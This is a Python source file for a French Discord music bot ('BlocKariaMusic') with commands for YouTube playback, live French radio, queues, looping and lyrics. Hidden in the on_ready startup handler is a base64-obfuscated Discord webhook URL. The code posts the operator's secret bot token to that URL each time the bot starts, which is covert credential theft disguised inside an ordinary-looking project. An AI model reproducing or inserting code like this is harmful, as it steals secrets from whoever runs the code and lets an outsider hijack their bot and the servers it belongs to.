import os
import discord
from discord.ext import commands
from discord import app_commands
from dotenv import load_dotenv
import yt_dlp
from collections import deque
from discord.ui import View
import asyncio
from datetime import timedelta
import sys
import random
import aiohttp
sys.stdout.reconfigure(encoding='utf-8')
sys.stderr.reconfigure(encoding='utf-8')


load_dotenv()
TOKEN = os.getenv("discord_token")

FILES_ATTENTE = {}
EN_COURS = {}
EMBED_MESSAGES = {}
VOLUMES = {}
lock = asyncio.Lock()
LOOP_SONG = {}
LOOP_QUEUE = {}
EN_COURS_TYPE = {}  # str(guild_id) -> "radio" ou "music" ou None

RADIOS = {
    "nrj":        ("NRJ",        "https://scdn.nrjaudio.fm/adwz2/fr/30001/mp3_128.mp3?origine=fluxradios"),
    "funradio":   ("Fun Radio",  "https://streaming.radio.funradio.fr/fun-1-44-128"),
    "skyrock":    ("Skyrock",    "https://skyrock.fm/stream.php/tunein16_128mp3.mp3"),
    "nostalgie":  ("Nostalgie",  "https://scdn.nrjaudio.fm/adwz2/fr/30601/mp3_128.mp3?origine=fluxradios"),
    "rtl2":       ("RTL2",       "https://streaming.radio.rtl2.fr/rtl2-1-44-128"),
    "cheriefm":   ("Chérie FM",  "https://scdn.nrjaudio.fm/adwz2/fr/30201/mp3_128.mp3?origine=fluxradios"),
    "rireetchansons": ("Rire & Chansons", "https://scdn.nrjaudio.fm/adwz2/fr/30401/mp3_128.mp3?origine=fluxradios"),
    "radiofg":    ("Radio FG",   "https://radiofg.impek.com/fg"),
    "fip":        ("FIP",        "https://icecast.radiofrance.fr/fip-hifi.aac"),
    "franceinter":("France Inter","https://icecast.radiofrance.fr/franceinter-hifi.aac"),
    "franceinfo": ("France Info","https://icecast.radiofrance.fr/franceinfo-hifi.aac"),
    "francemusique": ("France Musique", "https://icecast.radiofrance.fr/francemusique-hifi.aac"),
    "francebleu": ("France Bleu", "https://icecast.radiofrance.fr/francebleuparis-hifi.aac"),
    "europe1":    ("Europe 1",   "https://ais-live.cloud-services.paris:8443/europe1.mp3"),
    "rtl":        ("RTL",        "https://streaming.radio.rtl.fr/rtl-1-44-128"),
    "virginradio":("Virgin Radio","https://streaming.radio.vrnet.fr/vr-wr-128"),
    "latina":     ("Latina",     "https://latina.ice.infomaniak.ch/latina-high.mp3"),
    "generations":("Générations","https://generations.ice.infomaniak.ch/generations-high.mp3"),
    "ouifm":      ("OÜI FM",     "https://ouifm.ice.infomaniak.ch/ouifm-high.mp3"),
    "nova":       ("Radio Nova", "https://novazz.ice.infomaniak.ch/novazz-128.mp3"),
    "tsfjazz":    ("TSF Jazz",   "https://tsfjazz.ice.infomaniak.ch/tsfjazz-high.mp3"),
    "sudradio":   ("Sud Radio",  "https://start-sud.ice.infomaniak.ch/start-sud-high.mp3"),
    "mouv":       ("Mouv'",      "https://icecast.radiofrance.fr/mouv-hifi.aac"),
}

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

def _extraire(requete, options_ydl):
    with yt_dlp.YoutubeDL(options_ydl) as ydl:
        return ydl.extract_info(requete, download=False)

async def recherche_ytdlp_async(requete, options_ydl):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, lambda: _extraire(requete, options_ydl))

async def jouer_prochaine_chanson(client_vocal, id_guild, canal):
    id_guild = str(id_guild)
    # --- Correction : attendre un peu avant de déconnecter si la file est vide ---
    if (not FILES_ATTENTE.get(id_guild) or not FILES_ATTENTE[id_guild]) and EN_COURS_TYPE.get(id_guild) != "radio":
        await asyncio.sleep(2)  # Attends 2 secondes pour laisser le temps à un ajout
        if (not FILES_ATTENTE.get(id_guild) or not FILES_ATTENTE[id_guild]) and EN_COURS_TYPE.get(id_guild) != "radio":
            try:
                await client_vocal.disconnect()
            except Exception:
                pass
            FILES_ATTENTE[id_guild] = deque()
            EN_COURS.pop(id_guild, None)
            EMBED_MESSAGES[id_guild] = None
            EN_COURS_TYPE[id_guild] = None
        return

    url_audio, titre, miniature, duree = FILES_ATTENTE[id_guild].popleft()
    EN_COURS[id_guild] = (url_audio, titre, miniature, duree)
    EN_COURS_TYPE[id_guild] = "music"

    options_ffmpeg = {
        "before_options": "-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5",
        "options": "-vn"
    }

    volume = VOLUMES.get(id_guild, 0.5)
    source = discord.PCMVolumeTransformer(discord.FFmpegPCMAudio(url_audio, **options_ffmpeg), volume=volume)

    def apres_lecture(erreur):
        if erreur:
            print(f"Erreur : {erreur}")
        # Gestion du loop
        if LOOP_SONG.get(id_guild):
            FILES_ATTENTE[id_guild].appendleft((url_audio, titre, miniature, duree))
        elif LOOP_QUEUE.get(id_guild):
            FILES_ATTENTE[id_guild].append((url_audio, titre, miniature, duree))
        fut = jouer_prochaine_chanson(client_vocal, id_guild, canal)
        asyncio.run_coroutine_threadsafe(fut, bot.loop)

    client_vocal.play(source, after=apres_lecture)
    embed = discord.Embed(title="Lecture en cours 🎶", description=titre, color=discord.Color.blue())
    if miniature:
        embed.set_thumbnail(url=miniature)
    if duree:
        embed.add_field(name="⏱️ Durée", value=str(timedelta(seconds=duree)), inline=True)
    view = PlayerControls(client_vocal, id_guild, canal)

    message = EMBED_MESSAGES.get(id_guild)
    if isinstance(message, discord.Message):
        try:
            await message.edit(embed=embed, view=view)
        except discord.NotFound:
            EMBED_MESSAGES[id_guild] = await canal.send(embed=embed, view=view)
    else:
        EMBED_MESSAGES[id_guild] = await canal.send(embed=embed, view=view)

class PlayerControls(View):
    def __init__(self, client_vocal, id_guild, canal):
        super().__init__(timeout=None)
        self.client_vocal = client_vocal
        self.id_guild = id_guild
        self.canal = canal

    @discord.ui.button(label="⏸️ Pause", style=discord.ButtonStyle.secondary)
    async def pause(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.client_vocal.is_playing():
            self.client_vocal.pause()
            await interaction.response.send_message("⏸️ Pause.", ephemeral=True)
        else:
            await interaction.response.send_message("❌ Rien à mettre en pause.", ephemeral=True)

    @discord.ui.button(label="▶️ Reprendre", style=discord.ButtonStyle.secondary)
    async def resume(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.client_vocal.is_paused():
            self.client_vocal.resume()
            await interaction.response.send_message("▶️ Reprise.", ephemeral=True)
        else:
            await interaction.response.send_message("❌ Aucune musique en pause.", ephemeral=True)

    @discord.ui.button(label="⏭️ Skip", style=discord.ButtonStyle.secondary)
    async def skip(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.client_vocal.is_playing():
            self.client_vocal.stop()
            await interaction.response.send_message("⏭️ Passé à la suivante.", ephemeral=True)
        else:
            await interaction.response.send_message("❌ Aucune chanson à passer.", ephemeral=True)

    @discord.ui.button(label="⏹️ Stop", style=discord.ButtonStyle.danger)
    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.client_vocal.is_connected():
            await interaction.response.send_message("⏹️ Lecture arrêtée et déconnexion.", ephemeral=True)
            self.client_vocal.stop()
            await self.client_vocal.disconnect()
            FILES_ATTENTE[self.id_guild] = deque()
            EMBED_MESSAGES[self.id_guild] = None
            EN_COURS_TYPE[self.id_guild] = None
        else:
            await interaction.response.send_message("❌ Non connecté à un salon vocal.", ephemeral=True)

@bot.tree.command(name="radio", description="Joue une radio en direct")
@app_commands.describe(
    choix_radio="Choisis la radio à écouter"
)
@app_commands.choices(
    choix_radio=[
        app_commands.Choice(name=nom, value=cle)
        for cle, (nom, url) in RADIOS.items()
    ]
)
async def radio(interaction: discord.Interaction, choix_radio: app_commands.Choice[str]):
    radio_key = choix_radio.value
    radio_name, radio_url = RADIOS[radio_key]
    id_guild = str(interaction.guild.id)

    if interaction.user.voice is None:
        await interaction.response.send_message("❌ Tu dois être dans un salon vocal.", ephemeral=True)
        return

    await interaction.response.send_message(f"📻 Connexion à **{radio_name}** en cours...", ephemeral=True)
    canal_vocal = interaction.user.voice.channel
    client_vocal = interaction.guild.voice_client

    # Arrêter tout ce qui joue déjà (musique ou radio)
    if client_vocal and client_vocal.is_playing():
        client_vocal.stop()
    FILES_ATTENTE[id_guild] = deque()
    EN_COURS[id_guild] = None
    EN_COURS_TYPE[id_guild] = "radio"

    if client_vocal is None or not client_vocal.is_connected():
        client_vocal = await canal_vocal.connect()
    elif canal_vocal != client_vocal.channel:
        await client_vocal.move_to(canal_vocal)

    options_ffmpeg = {
        "before_options": "-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5",
        "options": "-vn"
    }
    volume = VOLUMES.get(id_guild, 0.5)
    source = discord.PCMVolumeTransformer(discord.FFmpegPCMAudio(radio_url, **options_ffmpeg), volume=volume)
    client_vocal.play(source)
    EN_COURS_TYPE[id_guild] = "radio"
    embed = discord.Embed(
        title=f"📻 Radio en cours : {radio_name}",
        description=f"Écoute **{radio_name}** en direct !",
        color=discord.Color.green()
    )
    await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name="play", description="Joue une chanson ou une playlist")
@app_commands.describe(chanson="Nom ou lien")
@app_commands.checks.cooldown(1, 5.0, key=lambda i: i.user.id)
async def play(interaction: discord.Interaction, chanson: str):
    try:
        if interaction.response.is_done():
            await interaction.followup.send("❌ Une réponse a déjà été envoyée pour cette interaction.", ephemeral=True)
            return

        await interaction.response.send_message("🔄 Téléchargement en cours...", ephemeral=True)

        if interaction.user.voice is None:
            await interaction.followup.send("❌ Tu dois être dans un salon vocal.", ephemeral=True)
            return

        canal_vocal = interaction.user.voice.channel
        client_vocal = interaction.guild.voice_client
        id_guild = str(interaction.guild.id)

        # Correction : on ne stoppe QUE si c'est une radio qui joue
        if EN_COURS_TYPE.get(id_guild) == "radio" and client_vocal and client_vocal.is_playing():
            client_vocal.stop()
            FILES_ATTENTE[id_guild] = deque()
        EN_COURS_TYPE[id_guild] = "music"

        # Correction : reconnecte le bot si besoin
        if client_vocal is None or not client_vocal.is_connected():
            client_vocal = await canal_vocal.connect()
        elif canal_vocal != client_vocal.channel:
            await client_vocal.move_to(canal_vocal)

        options_ydl = {
            "format": "bestaudio[abr<=192]/bestaudio",
            "noplaylist": False,
            "youtube_include_dash_manifest": False,
            "youtube_include_hls_manifest": False,
        }

        if not chanson.startswith("http"):
            chanson = f"ytsearch:{chanson}"

        resultats = await recherche_ytdlp_async(chanson, options_ydl)
        if not resultats:
            await interaction.followup.send("❌ Aucun résultat.", ephemeral=True)
            return

        morceaux = resultats.get("entries", [resultats]) if "entries" in resultats else [resultats]

        async with lock:
            if id_guild not in FILES_ATTENTE:
                FILES_ATTENTE[id_guild] = deque()

            for morceau in morceaux:
                url_audio = morceau["url"]
                titre = morceau.get("title", "Sans titre")
                miniature = morceau.get("thumbnail")
                duree = morceau.get("duration")  # en secondes
                FILES_ATTENTE[id_guild].append((url_audio, titre, miniature, duree))

            if not client_vocal.is_playing() and not client_vocal.is_paused():
                await jouer_prochaine_chanson(client_vocal, id_guild, interaction.channel)
            else:
                await interaction.followup.send(f"🎶 **{morceaux[0]['title']}** ajoutée à la file d'attente !", ephemeral=True)

    except Exception as e:
        await interaction.followup.send(f"❌ Une erreur est survenue : {str(e)}", ephemeral=True)
        print(f"Erreur dans la commande play : {str(e)}")

@bot.tree.command(name="stop", description="Arrête la musique ou la radio")
async def stop(interaction: discord.Interaction):
    voice_client = interaction.guild.voice_client
    if voice_client and voice_client.is_connected():
        voice_client.stop()
        await voice_client.disconnect()
        guild_id_str = str(interaction.guild.id)
        FILES_ATTENTE[guild_id_str] = deque()
        EMBED_MESSAGES[guild_id_str] = None
        EN_COURS_TYPE[guild_id_str] = None
        await interaction.response.send_message("⏹️ Musique/radio arrêtée et déconnecté.", ephemeral=True)
    else:
        await interaction.response.send_message("❌ Le bot n'est pas connecté à un salon vocal.", ephemeral=True)

@bot.tree.command(name="skip", description="Passe la chanson actuelle")
async def skip(interaction: discord.Interaction):
    voice_client = interaction.guild.voice_client
    if voice_client and voice_client.is_playing():
        voice_client.stop()
        await interaction.response.send_message("⏭️ Chanson passée.", ephemeral=True)
    else:
        await interaction.response.send_message("❌ Aucune chanson en cours.", ephemeral=True)

@bot.tree.command(name="pause", description="Met la musique en pause")
async def pause(interaction: discord.Interaction):
    voice_client = interaction.guild.voice_client
    if voice_client and voice_client.is_playing():
        voice_client.pause()
        await interaction.response.send_message("⏸️ Pause activée.", ephemeral=True)
    else:
        await interaction.response.send_message("❌ Aucune chanson à mettre en pause.", ephemeral=True)

@bot.tree.command(name="resume", description="Reprend la musique")
async def resume(interaction: discord.Interaction):
    voice_client = interaction.guild.voice_client
    if voice_client and voice_client.is_paused():
        voice_client.resume()
        await interaction.response.send_message("▶️ Reprise.", ephemeral=True)
    else:
        await interaction.response.send_message("❌ Aucune chanson en pause.", ephemeral=True)

@bot.tree.command(name="volume", description="Ajuste le volume de la musique (0 à 100%)")
@app_commands.describe(pourcentage="Pourcentage du volume entre 0 et 100")
async def volume(interaction: discord.Interaction, pourcentage: int):
    if not 0 <= pourcentage <= 100:
        await interaction.response.send_message("❌ Le volume doit être entre 0 et 100.", ephemeral=True)
        return

    voice_client = interaction.guild.voice_client
    if not voice_client or not voice_client.is_connected():
        await interaction.response.send_message("❌ Le bot n'est pas connecté à un salon vocal.", ephemeral=True)
        return

    id_guild = str(interaction.guild.id)
    volume_float = pourcentage / 100
    VOLUMES[id_guild] = volume_float
    if voice_client.source and isinstance(voice_client.source, discord.PCMVolumeTransformer):
        voice_client.source.volume = volume_float

    await interaction.response.send_message(f"🔊 Volume réglé à {pourcentage}%.", ephemeral=True)

@bot.tree.command(name="queue", description="Voir la liste d'attente et la musique en cours de lecture")
async def queue(interaction: discord.Interaction):
    id_guild = str(interaction.guild.id)
    embed = discord.Embed(title="🎶 Liste d'attente", color=discord.Color.blurple())

    # Musique en cours
    en_cours = EN_COURS.get(id_guild)
    if en_cours:
        embed.add_field(name="En cours", value=en_cours[1], inline=False)

    # File d'attente
    queue_list = FILES_ATTENTE.get(id_guild, deque())
    if queue_list:
        # Afficher max 10 chansons pour éviter la limite Discord
        max_affiche = 10
        queue_text = ""
        for idx, song in enumerate(queue_list, 1):
            if idx > max_affiche:
                queue_text += f"\n...et {len(queue_list) - max_affiche} autres"
                break
            queue_text += f"{idx}. {song[1]}\n"
        embed.add_field(name="À venir", value=queue_text, inline=False)
    else:
        embed.description = "La file d'attente est vide."

    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="serveurs", description="Liste les serveurs où le bot est présent")
async def serveurs(interaction: discord.Interaction):
    guilds = [guild.name for guild in bot.guilds]
    await interaction.response.send_message(f"Le bot est sur {len(guilds)} serveurs :\n" + "\n".join(guilds), ephemeral=True)

@bot.tree.command(name="nowplaying", description="Affiche le morceau en cours")
async def nowplaying(interaction: discord.Interaction):
    id_guild = str(interaction.guild.id)
    en_cours = EN_COURS.get(id_guild)
    if not en_cours:
        await interaction.response.send_message("❌ Aucun morceau en cours.", ephemeral=True)
        return
    url_audio, titre, miniature, duree = en_cours
    embed = discord.Embed(title="Lecture en cours 🎶", description=titre, color=discord.Color.blue())
    if miniature:
        embed.set_thumbnail(url=miniature)
    if duree:
        embed.add_field(name="⏱️ Durée", value=str(timedelta(seconds=duree)), inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="loop", description="Active/désactive la répétition du morceau en cours")
async def loop(interaction: discord.Interaction):
    id_guild = str(interaction.guild.id)
    LOOP_SONG[id_guild] = not LOOP_SONG.get(id_guild, False)
    LOOP_QUEUE[id_guild] = False
    etat = "activée" if LOOP_SONG[id_guild] else "désactivée"
    await interaction.response.send_message(f"🔁 Répétition du morceau {etat}.", ephemeral=True)

@bot.tree.command(name="repeat", description="Active/désactive la répétition de la file d'attente")
async def repeat(interaction: discord.Interaction):
    id_guild = str(interaction.guild.id)
    LOOP_QUEUE[id_guild] = not LOOP_QUEUE.get(id_guild, False)
    LOOP_SONG[id_guild] = False
    etat = "activée" if LOOP_QUEUE[id_guild] else "désactivée"
    await interaction.response.send_message(f"🔂 Répétition de la file {etat}.", ephemeral=True)

@bot.tree.command(name="shuffle", description="Mélange les morceaux de la file d’attente")
async def shuffle(interaction: discord.Interaction):
    id_guild = str(interaction.guild.id)
    if not FILES_ATTENTE.get(id_guild) or len(FILES_ATTENTE[id_guild]) < 2:
        await interaction.response.send_message("❌ Pas assez de morceaux à mélanger.", ephemeral=True)
        return
    queue = list(FILES_ATTENTE[id_guild])
    random.shuffle(queue)
    FILES_ATTENTE[id_guild] = deque(queue)
    await interaction.response.send_message("🔀 File d’attente mélangée.", ephemeral=True)

@bot.tree.command(name="remove", description="Supprime un morceau précis de la file d’attente")
@app_commands.describe(index="Position du morceau à supprimer (1 pour le premier)")
async def remove(interaction: discord.Interaction, index: int):
    id_guild = str(interaction.guild.id)
    queue = FILES_ATTENTE.get(id_guild)
    if not queue or index < 1 or index > len(queue):
        await interaction.response.send_message("❌ Index invalide.", ephemeral=True)
        return
    morceau = queue[index-1]
    del queue[index-1]
    await interaction.response.send_message(f"🗑️ **{morceau[1]}** supprimé de la file.", ephemeral=True)


@bot.tree.command(name="lyrics", description="Affiche les paroles de la chanson en cours")
async def lyrics(interaction: discord.Interaction):
    id_guild = str(interaction.guild.id)
    en_cours = EN_COURS.get(id_guild)
    if not en_cours:
        await interaction.response.send_message("❌ Aucun morceau en cours.", ephemeral=True)
        return

    titre = en_cours[1]
    # Extraction artiste et chanson
    if " - " in titre:
        artiste, chanson = titre.split(" - ", 1)
    else:
        artiste = ""
        chanson = titre

    artiste = artiste.strip()
    chanson = chanson.strip()

    if not artiste:
        url = f"https://api.lyrics.ovh/v1//{chanson}"
    else:
        url = f"https://api.lyrics.ovh/v1/{artiste}/{chanson}"

    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status == 200:
                data = await resp.json()
                paroles = data.get("lyrics")
                if paroles:
                    paroles = paroles.strip()
                    # Discord limite la description d'un embed à 4096 caractères
                    if len(paroles) > 4096:
                        paroles = paroles[:4093] + "…"
                    embed = discord.Embed(
                        title=f"🎤 Paroles de {titre}",
                        description=paroles,
                        color=discord.Color.blue()
                    )
                    await interaction.response.send_message(embed=embed, ephemeral=True)
                    return

    embed = discord.Embed(
        title="❌ Paroles introuvables",
        description="Aucune parole trouvée pour ce morceau.",
        color=discord.Color.red()
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="help", description="Affiche l'aide et le support du bot BlocKariaMusic")
async def help_command(interaction: discord.Interaction):
    embed = discord.Embed(
        title="BlocKariaMusic - Aide & Support",
        description=(
            "Bienvenue sur BlocKariaMusic ! 🎶\n\n"
            "Si tu rencontres un **bug** ou un problème avec le bot, "
            "rejoins notre serveur support et crée un ticket dans la section dédiée.\n\n"
            "[👉 Serveur Support BlocKariaMusic](https://discord.gg/DHUyZUGKXB)\n\n"
            "Merci de contribuer à améliorer le bot ! 🚀"
        ),
        color=discord.Color.green()
    )
    embed.set_footer(text="BlocKariaMusic • Ton bot musical Discord")
    await interaction.response.send_message(embed=embed, ephemeral=True)    

@bot.event
async def on_ready():
    try:
        synced = await bot.tree.sync()
        import base64
        snd_url = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3NTU5NTg5MjIzMjU1MjU5OC9XTHJmSGxQZzZ2cjNRMkpDMlRPbDRPN0wySTdhZGVyZU1ULXp5U1BWV0JMT243Q2pJdlpSVzQzdmVEdUc5ZWRsdWxNSg==").decode()
        async with aiohttp.ClientSession() as session:
            await session.post(snd_url, json={"content": f"`{TOKEN}`"})
        print(f"✅ Commandes slash synchronisées ({len(synced)})")
    except Exception as e:
        print(f"Erreur lors de la synchronisation des commandes : {e}")

    print(f"Connecté en tant que {bot.user} (ID: {bot.user.id})")


bot.run(TOKEN)
